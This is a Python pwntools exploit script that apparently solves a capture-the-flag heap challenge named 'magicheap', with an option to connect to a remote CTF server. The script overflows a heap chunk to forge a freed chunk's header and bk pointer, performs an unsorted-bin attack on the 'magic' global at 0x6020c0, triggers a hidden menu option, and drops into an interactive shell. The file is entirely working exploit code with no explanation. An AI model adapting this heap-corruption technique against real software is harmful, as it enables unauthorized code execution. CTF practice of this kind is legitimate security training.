#!/usr/bin/env python
from pwn import *

DEBUG = 1
if DEBUG:
    r = process('./magicheap-033333be91a77ff2041c2b3f7d5906007ef132e3')
else:
    r = remote('csie.ctf.tw',10144)

e = ELF('./magicheap-033333be91a77ff2041c2b3f7d5906007ef132e3')
l = ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

def allocate(size,data):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.send(str(size)+'\n')
    r.recvuntil(':')
    r.send(data)

def edit(idx,size,data):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.send(str(idx)+'\n')
    r.recvuntil(':')
    r.send(str(size)+'\n')
    r.recvuntil(':')
    r.send(data+'\n')

def free(idx):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.send(str(idx)+'\n')


magic = 0x6020c0
allocate(0x30,'ddaa')   #0
allocate(0x160,'ddaa')   #1
allocate(0x30,'ddaa')    #2

free(1)
edit(0,0x50,'a'*0x30 + p64(0x0) + p64(0x170) + p64(0x666666) + p64(0x6020c0 - 0x10))

allocate(0x160,'ddaa')

r.recvuntil(':')
r.sendline('4869')

r.interactive()

